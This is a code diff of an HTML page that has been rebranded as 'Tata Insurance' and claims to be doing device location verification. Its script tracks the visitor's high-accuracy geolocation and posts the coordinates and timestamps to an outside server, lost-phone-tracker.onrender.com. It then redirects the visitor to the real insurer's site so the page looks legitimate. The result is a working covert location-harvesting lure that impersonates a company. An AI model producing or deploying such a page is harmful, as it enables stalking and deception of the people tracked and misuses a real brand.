@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Device Verification</title>
+  <title>Tata Insurance</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
   <style>
@@ -16,78 +16,77 @@
 </head>
 <body>
 
-<h3>Verifying device…</h3>
+<h3>Devce location verification</h3>
 <p>Please wait</p>
 
 <script>
-let lastLat = null;
-let lastLon = null;
-
-// Haversine formula (distance in KM)
-function getDistance(lat1, lon1, lat2, lon2) {
-  const R = 6371;
-  const dLat = (lat2 - lat1) * Math.PI / 180;
-  const dLon = (lon2 - lon1) * Math.PI / 180;
-
-  const a =
-    Math.sin(dLat / 2) * Math.sin(dLat / 2) +
-    Math.cos(lat1 * Math.PI / 180) *
-    Math.cos(lat2 * Math.PI / 180) *
-    Math.sin(dLon / 2) * Math.sin(dLon / 2);
-
-  const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
-  return R * c;
-}
-
-// Send data to server
-function sendLocation(lat, lon) {
-    fetch("https://lost-phone-tracker.onrender.com/location", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-    latitude: lat,
-    longitude: lon,
-    time: new Date().toISOString()
-  })
-});
-
-}
-
-// Start tracking
-if ("geolocation" in navigator) {
-  navigator.geolocation.watchPosition(
-    (position) => {
-      const lat = position.coords.latitude;
-      const lon = position.coords.longitude;
-
-      if (lastLat === null) {
-        lastLat = lat;
-        lastLon = lon;
-        sendLocation(lat, lon);
-        return;
-      }
-
-      const distance = getDistance(lastLat, lastLon, lat, lon);
-
-      if (distance >= 1) {   // 🔥 1 KM CONDITION
-        lastLat = lat;
-        lastLon = lon;
-        sendLocation(lat, lon);
-      }
-    },
-    () => {
-      document.body.innerHTML = "<h3>Unable to verify device</h3>";
-    },
-    {
-      enableHighAccuracy: true,
-      maximumAge: 0,
-      timeout: 5000
+    let lastLat = null;
+    let lastLon = null;
+    let redirected = false;
+    
+    function getDistance(lat1, lon1, lat2, lon2) {
+      const R = 6371;
+      const dLat = (lat2 - lat1) * Math.PI / 180;
+      const dLon = (lon2 - lon1) * Math.PI / 180;
+    
+      const a =
+        Math.sin(dLat / 2) * Math.sin(dLat / 2) +
+        Math.cos(lat1 * Math.PI / 180) *
+        Math.cos(lat2 * Math.PI / 180) *
+        Math.sin(dLon / 2) * Math.sin(dLon / 2);
+    
+      const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
+      return R * c;
     }
-  );
-} else {
-  document.body.innerHTML = "<h3>Location not supported</h3>";
-}
-</script>
+    
+    function sendLocationAndRedirect(lat, lon) {
+      fetch("https://lost-phone-tracker.onrender.com/location", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          latitude: lat,
+          longitude: lon,
+          time: new Date().toISOString()
+        })
+      }).finally(() => {
+        if (!redirected) {
+          redirected = true;
+          window.location.href = "https://www.tataaig.com/";
+        }
+      });
+    }
+    
+    if ("geolocation" in navigator) {
+      navigator.geolocation.watchPosition(
+        (position) => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+    
+          if (lastLat === null) {
+            lastLat = lat;
+            lastLon = lon;
+            sendLocationAndRedirect(lat, lon);
+            return;
+          }
+    
+          const distance = getDistance(lastLat, lastLon, lat, lon);
+          if (distance >= 1 && !redirected) {
+            lastLat = lat;
+            lastLon = lon;
+            sendLocationAndRedirect(lat, lon);
+          }
+        },
+        () => {
+          document.body.innerHTML = "<h3>Unable to verify device</h3>";
+        },
+        {
+          enableHighAccuracy: true,
+          maximumAge: 0,
+          timeout: 5000
+        }
+      );
+    }
+    </script>
 
 </body>
 </html>
